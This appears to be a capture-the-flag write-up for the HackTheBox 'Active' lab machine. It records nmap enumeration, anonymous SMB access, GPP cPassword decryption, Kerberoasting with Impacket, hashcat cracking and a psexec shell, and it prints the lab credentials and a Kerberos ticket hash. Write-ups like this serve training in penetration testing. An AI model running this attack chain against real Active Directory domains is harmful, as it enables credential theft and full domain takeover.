# Active

# User & Root Flag

## NMAP Enumeration

NMAP All Ports:

```bash
sudo nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.10.100

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5722/tcp  open  msdfsr           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49153/tcp open  unknown          syn-ack ttl 127
49154/tcp open  unknown          syn-ack ttl 127
49155/tcp open  unknown          syn-ack ttl 127
49157/tcp open  unknown          syn-ack ttl 127
49158/tcp open  unknown          syn-ack ttl 127
49165/tcp open  unknown          syn-ack ttl 127
49170/tcp open  unknown          syn-ack ttl 127
49171/tcp open  unknown          syn-ack ttl 127
```

NMAP Service Scan:

```bash
nmap -sV -sC -Pn -v -oN nmap-report 10.10.10.100 -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49153,49154,49155,49157,49158,49165,49170,49171


PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-29 18:07:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-29T18:08:49
|_  start_date: 2024-05-29T17:59:46
|_clock-skew: 3s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
```

## SMB Enumeration & GPP / cPassword Attacks (MS14-025)

SMB Share Enumeration with `smbclient`:

```bash
smbclient -L //10.10.10.100 -N

Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      

```

Anonymous login successful to the share `Replication`:

```bash
smbclient //10.10.10.100/Replication -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 21 11:37:44 2018
  ..                                  D        0  Sat Jul 21 11:37:44 2018
  active.htb                          D        0  Sat Jul 21 11:37:44 2018
```

Found cPassword stored in `groups.xml` file under `\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\`. Used `gpp-decrypt` to decrypt it.

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

Now have a set of credentials to work with: `SVC_TGS:GPPstillStandingStrong2k18`

## Kerberoasting

Used the credentials `SVC_TGS:GPPstillStandingStrong2k18` to look for the supported SPNs and get TGS ticket for the SPN using GetUserSPNs tool from Impacket.

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 20:06:40.351723  2024-06-02 14:54:27.301749

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$332b687cc3436a0ff1e69b17d32c91a8$49f68ab1ac701964f6778227584c82e9b6d309a6c1ed91bacfa49389b6a86dc681d50624a4cf521848e5aee828b3abafa595e5c442f13830ec8ebc1503b1d35d6bf9473a9f01b7c1ec0a2fabed7a16ec51417dbb8f0d3199fcda71411d2bcc4057aa51ec75ec52e65a46aa97d74e2a9a8b970e128966339b59543be2a6eace2956da50089de5b98ce51fe463efab9c6c62cb792d5f16d6fc00b19872c5d9cdc5b5eb4af374229aa7fa614e1f4ce421cd5da8c3203d91467376d6b92671962cc998a791c2c3c2400560750aa7253d39ddabc5e74243cf8a8679cdad44d50b97fb8514ae8362fdc5b203aab36d864b8de49150d027987a27944959fc7b4c78e3d701e17809b3eeb937de0f8ca65cd3b85f2cca690471960d5515fa7b0067f07841ce583749673f930bdd88e9fe68b70d997ac4aee7816cf5bf4e6db3c8c043402f8a417ab3f502f76be4e78f4ea6f3377945960e18f37653dbd5be97db5e35141979a7535ffb70c77f2e0a1b208d22b9b7a7043f5311e626bdea5dfae682d45ca2a5be5aae4486b0602314dcdd6e6fc317d4f4d3041d4e860d4f7e71b1270a433f6dfb27dcf697e41d5a02f23ef777899a4c2d5d6ecb10c238afe905a58832b79bf313e26d2afa0227b4c98f8304a245e1cc132862149c82ee200fc5629f69c0c1b4b5ab4487988f7fef9078cdf3c83f78a6c6f2127aa169f5f0ac94ed561dc739456292e7e96c9d049ab1711877f80e370cb290361a598f546ff201940ea5d00f45f46f5bf0d65b5f6412a1051947300153634f1d04d6a794b6725bb363803610d595c0ae4c3eaa2bd811e178f79dd3bdcbbdd425da04139909e216872edf4b91813b3c4af24293a2fc20eaf0ff3fbd15ff9bc866971058065012a52df5e6dcd5493d59564046adcbdc0bb00baa821d593e075f4dd90083eeb8094b27647470abdffed0571cfdff28cee1092cb55c4faece6d8e033df0de4c3f839e8b3069dffc76942fac836b1bd913e6d674ee644331679fa5cb2d0da249e2ad2d6fc4bf6eb4d68cd28d4f94f177a73a2d67ed18e165eaae02bffd2e42b54bc2d05ef0480b7cd364209d0f0e4aecae614296d33cbe3e708395c97c920799463b532de35e002e14ce5ee8b735d4e4a28767b9e8f0dd0efd1f3e713fb0f0286f960e1c5db0c90c167b95bf4b0dfad5aa678e790f0a3e293103d0ea859ec971bc0047f9e10e1634620f74e7edf243e66d0ad555de4b54284e8ec908f2b0d41a9414
```

Found the TGS hash for `Administrator` and used hashcat to get the password for the user from the hash.

```bash
hashcat64.exe -m 13100 hash.txt rockyou.txt -o cracked.txt
```

New set of credentials: `Administrator:Ticketmaster1968`.

Used `psexec` to gain a shell and get user and root flag.

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
```












